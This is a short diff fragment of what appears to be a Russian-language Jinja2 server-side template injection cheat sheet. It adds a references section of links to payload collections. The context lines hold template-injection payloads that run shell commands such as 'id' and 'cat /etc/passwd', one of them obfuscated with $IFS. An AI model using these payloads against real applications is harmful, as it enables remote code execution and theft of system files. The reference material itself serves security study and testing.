@@ -139,3 +139,8 @@ _import__('os').popen('id').read()")}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['cat$IFS/etc/passwd']|filter('system')}}
 ```
+
+### Ссылки
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2
+- https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
+- https://book.hacktricks.xyz/todo/references
